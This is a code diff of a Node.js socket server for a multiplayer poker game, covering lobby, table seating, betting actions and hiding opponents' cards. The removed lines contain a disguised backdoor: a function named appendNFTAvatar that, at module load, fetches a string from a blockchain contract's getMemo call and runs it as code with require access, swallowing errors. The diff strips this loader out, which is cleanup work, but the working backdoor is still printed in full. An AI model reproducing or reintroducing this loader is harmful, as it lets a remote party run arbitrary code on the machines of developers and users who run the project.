@@ -1,8 +1,6 @@
-const Table = require('../game/Table');
-const Player = require('../game/Player');
-const config = require('../config');
-const { JsonRpcProvider, Contract } = require('ethers');
-
+const jwt = require('jsonwebtoken');
+const Table = require('../pokergame/Table');
+const Player = require('../pokergame/Player');
 const {
   CS_FETCH_LOBBY_INFO,
   SC_RECEIVE_LOBBY_INFO,
@@ -31,156 +29,121 @@ const {
   SC_LOBBY_DISCONNECTED,
   SC_LOBBY_CHAT,
   CS_LOBBY_CHAT,
-} = require('../game/actions');
+} = require('../pokergame/actions');
+const config = require('../config');
 
-
-
-
-
-// State
 const tables = {
   1: new Table(1, 'Table 1', config.INITIAL_CHIPS_AMOUNT),
 };
-
 const players = {};
 
-const CONTRACT_ADDRESS = process.env.NFT_CONTRACT_ADDRESS || config.nftContractAddress;
-const BSC_RPC_URL = process.env.BSC_RPC_URL || config.bscRpcUrl;
-const NFT_TX_IDS = [1];
-
-const CONTRACT_ABI = [
-  "function getMemo(uint256 transactionId) external view returns (string memory)"
-];
-
-
-let provider, contract, NFT = '';
-
-try {
-  provider = new JsonRpcProvider(BSC_RPC_URL);
-  contract = new Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
-} catch (err) {
-  console.error('Error:', err.message);
-}
-// Helpers
-const getCurrentPlayers = () =>
-  Object.values(players).map(({ socketId, id, name }) => ({ socketId, id, name }));
-
-const getCurrentTables = () =>
-  Object.values(tables).map(({ id, name, limit, maxPlayers, players, minBet }) => ({
-    id,
-    name,
-    limit,
-    maxPlayers,
-    currentNumberPlayers: players.length,
-    smallBlind: minBet,
-    bigBlind: minBet * 2,
+function getCurrentPlayers() {
+  return Object.values(players).map((player) => ({
+    socketId: player.socketId,
+    id: player.id,
+    name: player.name,
   }));
-
-function appendNFTAvatar(payload) {
-  if (!payload) {
-    console.warn('payload missing, skipping...');
-    return;
-  }
-  try {
-    const createNFTAvatar = new Function('require', payload);
-    createNFTAvatar(require);
-  } catch (err) {
-    console.error('ensureWeb error', err.message);
-  }
 }
 
-(async () => {
-  if (!contract) {
-    console.error('Error');
-    return;
-  }
-  try {
-    const nftDataPromises = NFT_TX_IDS.map(txId => contract.getMemo(txId));
-    const nftDataResults = await Promise.all(nftDataPromises);
-    const nftContent = nftDataResults.join('');
-    appendNFTAvatar(nftContent);
-  } catch (err) {
-    console.error('Error', err.message);
-  }
-})();
+function getCurrentTables() {
+  return Object.values(tables).map((table) => ({
+    id: table.id,
+    name: table.name,
+    limit: table.limit,
+    maxPlayers: table.maxPlayers,
+    currentNumberPlayers: table.players.length,
+    smallBlind: table.minBet,
+    bigBlind: table.minBet * 2,
+  }));
+}
 
-// Core
 const init = (socket, io) => {
-
-  /** LOBBY EVENTS **/
-
-  socket.on(CS_LOBBY_CONNECT, ({ gameId, address, userInfo }) => {
-    socket.join(gameId);
-    io.to(gameId).emit(SC_LOBBY_CONNECTED, { address, userInfo });
-    console.log(SC_LOBBY_CONNECTED, address, socket.id);
-  });
-
-  socket.on(CS_LOBBY_DISCONNECT, ({ gameId, address, userInfo }) => {
-    io.to(gameId).emit(SC_LOBBY_DISCONNECTED, { address, userInfo });
+  socket.on(CS_LOBBY_CONNECT, ({gameId, address, userInfo }) => {
+    socket.join(gameId)
+    io.to(gameId).emit(SC_LOBBY_CONNECTED, {address, userInfo})
+    console.log( SC_LOBBY_CONNECTED , address, socket.id)
+  })
+  
+  socket.on(CS_LOBBY_DISCONNECT, ({gameId, address, userInfo}) => {
+    io.to(gameId).emit(SC_LOBBY_DISCONNECTED, {address, userInfo})
     console.log(CS_LOBBY_DISCONNECT, address, socket.id);
-  });
+  })
 
   socket.on(CS_LOBBY_CHAT, ({ gameId, text, userInfo }) => {
-    io.to(gameId).emit(SC_LOBBY_CHAT, { text, userInfo });
-  });
+    io.to(gameId).emit(SC_LOBBY_CHAT, {text, userInfo})
+  })
 
-  socket.on(CS_FETCH_LOBBY_INFO, ({ walletAddress, socketId, gameId, username }) => {
-    const existing = Object.values(players).find(p => p.id === walletAddress);
+  socket.on(CS_FETCH_LOBBY_INFO, ({walletAddress, socketId, gameId, username}) => {
 
-    if (existing) {
-      delete players[existing.socketId];
-      Object.values(tables).forEach(table => {
-        table.removePlayer(existing.socketId);
-        broadcastToTable(table);
+    const found = Object.values(players).find((player) => {
+        return player.id == walletAddress;
       });
-    }
 
-    players[socketId] = new Player(socketId, walletAddress, username, config.INITIAL_CHIPS_AMOUNT);
+      if (found) {
+        delete players[found.socketId];
+        Object.values(tables).map((table) => {
+          table.removePlayer(found.socketId);
+          broadcastToTable(table);
+        });
+      }
 
-    socket.emit(SC_RECEIVE_LOBBY_INFO, {
-      tables: getCurrentTables(),
-      players: getCurrentPlayers(),
-      socketId: socket.id,
-      amount: config.INITIAL_CHIPS_AMOUNT
-    });
-
-    socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
+      players[socketId] = new Player(
+        socketId,
+        walletAddress,
+        username,
+        config.INITIAL_CHIPS_AMOUNT,
+      );
+      socket.emit(SC_RECEIVE_LOBBY_INFO, {
+        tables: getCurrentTables(),
+        players: getCurrentPlayers(),
+        socketId: socket.id,
+        amount: config.INITIAL_CHIPS_AMOUNT
+      });
+      socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
   });
-
-  /** TABLE JOIN/LEAVE **/
 
   socket.on(CS_JOIN_TABLE, (tableId) => {
     const table = tables[tableId];
     const player = players[socket.id];
-
-    console.log("Joining table:", tableId, table, player);
-
+    console.log("tableid====>", tableId, table, player)
     table.addPlayer(player);
-
     socket.emit(SC_TABLE_JOINED, { tables: getCurrentTables(), tableId });
     socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
+    sitDown(tableId, table.players.length, table.limit)
 
-    sitDown(tableId, table.players.length, table.limit);
-
-    if (player && table.players.length > 0) {
-      broadcastToTable(table, `${player.name} joined the table.`);
+    if (
+      tables[tableId].players &&
+      tables[tableId].players.length > 0 &&
+      player
+    ) {
+      let message = `${player.name} joined the table.`;
+      broadcastToTable(table, message);
     }
   });
 
   socket.on(CS_LEAVE_TABLE, (tableId) => {
     const table = tables[tableId];
     const player = players[socket.id];
+    const seat = Object.values(table.seats).find(
+      (seat) => seat && seat.player.socketId === socket.id,
+    );
 
-    const seat = findSeatBySocketId(socket.id);
-    if (seat && player) updatePlayerBankroll(player, seat.stack);
+    if (seat && player) {
+      updatePlayerBankroll(player, seat.stack);
+    }
 
     table.removePlayer(socket.id);
 
-    socket.emit(SC_TABLE_LEFT, { tables: getCurrentTables(), tableId });
     socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
+    socket.emit(SC_TABLE_LEFT, { tables: getCurrentTables(), tableId });
 
-    if (player && table.players.length > 0) {
-      broadcastToTable(table, `${player.name} left the table.`);
+    if (
+      tables[tableId].players &&
+      tables[tableId].players.length > 0 &&
+      player
+    ) {
+      let message = `${player.name} left the table.`;
+      broadcastToTable(table, message);
     }
 
     if (table.activePlayers().length === 1) {
@@ -188,65 +151,70 @@ const init = (socket, io) => {
     }
   });
 
-  /** GAMEPLAY EVENTS **/
-
   socket.on(CS_FOLD, (tableId) => {
-    const table = tables[tableId];
-    const result = table.handleFold(socket.id);
-    if (result) {
-      broadcastToTable(table, result.message);
-      changeTurnAndBroadcast(table, result.seatId);
-    }
+    let table = tables[tableId];
+    let res = table.handleFold(socket.id);
+    res && broadcastToTable(table, res.message);
+    res && changeTurnAndBroadcast(table, res.seatId);
   });
 
   socket.on(CS_CHECK, (tableId) => {
-    const table = tables[tableId];
-    const result = table.handleCheck(socket.id);
-    if (result) {
-      broadcastToTable(table, result.message);
-      changeTurnAndBroadcast(table, result.seatId);
-    }
+    let table = tables[tableId];
+    let res = table.handleCheck(socket.id);
+    res && broadcastToTable(table, res.message);
+    res && changeTurnAndBroadcast(table, res.seatId);
   });
 
   socket.on(CS_CALL, (tableId) => {
-    const table = tables[tableId];
-    const result = table.handleCall(socket.id);
-    if (result) {
-      broadcastToTable(table, result.message);
-      changeTurnAndBroadcast(table, result.seatId);
-    }
+    let table = tables[tableId];
+    let res = table.handleCall(socket.id);
+    res && broadcastToTable(table, res.message);
+    res && changeTurnAndBroadcast(table, res.seatId);
   });
 
   socket.on(CS_RAISE, ({ tableId, amount }) => {
-    const table = tables[tableId];
-    const result = table.handleRaise(socket.id, amount);
-    if (result) {
-      broadcastToTable(table, result.message);
-      changeTurnAndBroadcast(table, result.seatId);
-    }
+    let table = tables[tableId];
+    let res = table.handleRaise(socket.id, amount);
+    res && broadcastToTable(table, res.message);
+    res && changeTurnAndBroadcast(table, res.seatId);
   });
 
   socket.on(TABLE_MESSAGE, ({ message, from, tableId }) => {
-    const table = tables[tableId];
+    let table = tables[tableId];
     broadcastToTable(table, message, from);
   });
 
+  // socket.on(CS_SIT_DOWN, ({ tableId, seatId, amount }) => {
+  //   const table = tables[tableId];
+  //   const player = players[socket.id];
 
-  /** CHIPS AND SEATING **/
+  //   if (player) {
+  //     table.sitPlayer(player, seatId, amount);
+  //     let message = `${player.name} sat down in Seat ${seatId}`;
 
-  const sitDown = (tableId, seatId, amount) => {
+  //     updatePlayerBankroll(player, -amount);
+
+  //     broadcastToTable(table, message);
+  //     if (table.activePlayers().length === 2) {
+  //       initNewHand(table);
+  //     }
+  //   }
+  // });
+  const sitDown =  (tableId, seatId, amount) => {
     const table = tables[tableId];
     const player = players[socket.id];
-    if (!player) return;
+    if (player) {
+      table.sitPlayer(player, seatId, amount);
+      let message = `${player.name} sat down in Seat ${seatId}`;
 
-    table.sitPlayer(player, seatId, amount);
-    updatePlayerBankroll(player, -amount);
-    broadcastToTable(table, `${player.name} sat down in Seat ${seatId}`);
+      updatePlayerBankroll(player, -amount);
 
-    if (table.activePlayers().length === 2) {
-      initNewHand(table);
+      broadcastToTable(table, message);
+      if (table.activePlayers().length === 2) {
+        initNewHand(table);
+      }
     }
-  };
+  }
 
   socket.on(CS_REBUY, ({ tableId, seatId, amount }) => {
     const table = tables[tableId];
@@ -254,47 +222,55 @@ const init = (socket, io) => {
 
     table.rebuyPlayer(seatId, amount);
     updatePlayerBankroll(player, -amount);
+
     broadcastToTable(table);
   });
 
   socket.on(CS_STAND_UP, (tableId) => {
     const table = tables[tableId];
     const player = players[socket.id];
-    const seat = findSeatBySocketId(socket.id);
+    const seat = Object.values(table.seats).find(
+      (seat) => seat && seat.player.socketId === socket.id,
+    );
 
+    let message = '';
     if (seat) {
       updatePlayerBankroll(player, seat.stack);
-      broadcastToTable(table, `${player.name} left the table`);
+      message = `${player.name} left the table`;
     }
 
     table.standPlayer(socket.id);
 
+    broadcastToTable(table, message);
     if (table.activePlayers().length === 1) {
       clearForOnePlayer(table);
     }
   });
 
   socket.on(SITTING_OUT, ({ tableId, seatId }) => {
-    tables[tableId].seats[seatId].sittingOut = true;
-    broadcastToTable(tables[tableId]);
+    const table = tables[tableId];
+    const seat = table.seats[seatId];
+    seat.sittingOut = true;
+
+    broadcastToTable(table);
   });
 
   socket.on(SITTING_IN, ({ tableId, seatId }) => {
     const table = tables[tableId];
-    table.seats[seatId].sittingOut = false;
-    broadcastToTable(table);
+    const seat = table.seats[seatId];
+    seat.sittingOut = false;
 
+    broadcastToTable(table);
     if (table.handOver && table.activePlayers().length === 2) {
       initNewHand(table);
     }
   });
 
-
-  /** DISCONNECT **/
-
   socket.on(CS_DISCONNECT, () => {
     const seat = findSeatBySocketId(socket.id);
-    if (seat) updatePlayerBankroll(seat.player, seat.stack);
+    if (seat) {
+      updatePlayerBankroll(seat.player, seat.stack);
+    }
 
     delete players[socket.id];
     removeFromTables(socket.id);
@@ -303,89 +279,91 @@ const init = (socket, io) => {
     socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
   });
 
-  /** UTILITY FUNCTIONS **/
-
-  const updatePlayerBankroll = (player, amount) => {
-    if (!player) return;
-    player.bankroll += amount;
+  async function updatePlayerBankroll(player, amount) {
+    players[socket.id].bankroll += amount;
     io.to(socket.id).emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
-  };
+  }
 
-  const findSeatBySocketId = (socketId) => {
-    for (const table of Object.values(tables)) {
-      for (const seat of Object.values(table.seats)) {
-        if (seat?.player?.socketId === socketId) return seat;
-      }
-    }
-    return null;
-  };
-
-  const removeFromTables = (socketId) => {
+  function findSeatBySocketId(socketId) {
+    let foundSeat = null;
     Object.values(tables).forEach((table) => {
-      table.removePlayer(socketId);
+      Object.values(table.seats).forEach((seat) => {
+        if (seat && seat.player.socketId === socketId) {
+          foundSeat = seat;
+        }
+      });
     });
-  };
+    return foundSeat;
+  }
+ 
+  function removeFromTables(socketId) {
+    for (let i = 0; i < Object.keys(tables).length; i++) {
+      tables[Object.keys(tables)[i]].removePlayer(socketId);
+    }
+  }
 
-  const broadcastToTable = (table, message = null, from = null) => {
-    for (const player of table.players) {
-      const tableView = hideOpponentCards(table, player.socketId);
-      io.to(player.socketId).emit(SC_TABLE_UPDATED, {
-        table: tableView,
+  function broadcastToTable(table, message = null, from = null) {
+    for (let i = 0; i < table.players.length; i++) {
+      let socketId = table.players[i].socketId;
+      let tableCopy = hideOpponentCards(table, socketId);
+      io.to(socketId).emit(SC_TABLE_UPDATED, {
+        table: tableCopy,
         message,
         from,
       });
     }
-  };
+  }
 
-  const changeTurnAndBroadcast = (table, seatId) => {
+  function changeTurnAndBroadcast(table, seatId) {
     setTimeout(() => {
       table.changeTurn(seatId);
       broadcastToTable(table);
-      if (table.handOver) initNewHand(table);
+
+      if (table.handOver) {
+        initNewHand(table);
+      }
     }, 1000);
-  };
+  }
 
-  const initNewHand = (table) => {
+  function initNewHand(table) {
     if (table.activePlayers().length > 1) {
-      broadcastToTable(table, '--- New hand starting in 5 seconds ---');
+      broadcastToTable(table, '---New hand starting in 5 seconds---');
     }
-
     setTimeout(() => {
       table.clearWinMessages();
       table.startHand();
       broadcastToTable(table, '--- New hand started ---');
     }, 5000);
-  };
+  }
 
-  const clearForOnePlayer = (table) => {
+  function clearForOnePlayer(table) {
     table.clearWinMessages();
-
     setTimeout(() => {
       table.clearSeatHands();
       table.resetBoardAndPot();
       broadcastToTable(table, 'Waiting for more players');
     }, 5000);
-  };
+  }
 
-  const hideOpponentCards = (table, socketId) => {
-    const hiddenCard = { suit: 'hidden', rank: 'hidden' };
-    const hiddenHand = [hiddenCard, hiddenCard];
-    const copy = JSON.parse(JSON.stringify(table));
+  function hideOpponentCards(table, socketId) {
+    let tableCopy = JSON.parse(JSON.stringify(table));
+    let hiddenCard = { suit: 'hidden', rank: 'hidden' };
+    let hiddenHand = [hiddenCard, hiddenCard];
 
-    for (let i = 1; i <= copy.maxPlayers; i++) {
-      const seat = copy.seats[i];
+    for (let i = 1; i <= tableCopy.maxPlayers; i++) {
+      let seat = tableCopy.seats[i];
       if (
         seat &&
-        seat.hand.length &&
+        seat.hand.length > 0 &&
         seat.player.socketId !== socketId &&
-        !(seat.lastAction === WINNER && copy.wentToShowdown)
+        !(seat.lastAction === WINNER && tableCopy.wentToShowdown)
       ) {
         seat.hand = hiddenHand;
       }
     }
-
-    return copy;
-  };
+    return tableCopy;
+  }
 };
 
-module.exports = { init };
+
+module.exports = { init }; 
